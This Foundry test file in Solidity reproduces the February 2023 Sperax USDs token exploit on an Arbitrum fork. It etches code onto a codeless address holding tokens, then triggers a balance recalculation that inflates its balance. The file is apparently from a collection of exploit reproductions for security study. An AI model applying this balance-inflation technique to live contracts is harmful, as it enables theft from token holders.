// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "forge-std/console.sol";

// @Analysis
// https://twitter.com/danielvf/status/1621965412832350208
// https://medium.com/sperax/usds-feb-3-exploit-report-from-engineering-team-9f0fd3cef00c
// @TX
// https://arbiscan.io/tx/0xfaf84cabc3e1b0cf1ff1738dace1b2810f42d98baeea17b146ae032f0bdf82d5

interface USDs {
    function balanceOf(address _account) external returns (uint256);
    function mint(address _account, uint256 _amount) external;
    function transfer(address to, uint256 amount) external returns (bool);
    function vaultAddress() external returns (address);
}

contract USDsTest is Test {
    USDs usds = USDs(0xD74f5255D557944cf7Dd0E45FF521520002D5748);
    address ATTACKER_CONTRACT = address(0xdeadbeef);

    function setUp() public {
        vm.createSelectFork("arbitrum", 57_803_529);

        vm.label(address(usds), "USDs");
        vm.label(0x97A7E6Cf949114Fe4711018485D757b9c4962307, "USDsImpl");
        vm.label(ATTACKER_CONTRACT, "AttackerContract");
        vm.label(address(this), "AttackerAddress");

        vm.prank(usds.vaultAddress());
        usds.mint(address(this), 11e18);
    }

    function testExploit() public {
        usds.transfer(ATTACKER_CONTRACT, 11e18);

        // Etch code. In the real hack this was a Gnosis Safe being deployed
        vm.etch(ATTACKER_CONTRACT, bytes("code"));

        // Trigger balance recalculation
        vm.prank(ATTACKER_CONTRACT);
        usds.transfer(address(this), 1);

        console.log("Attacker Contract balance after: ", usds.balanceOf(ATTACKER_CONTRACT));
    }
}
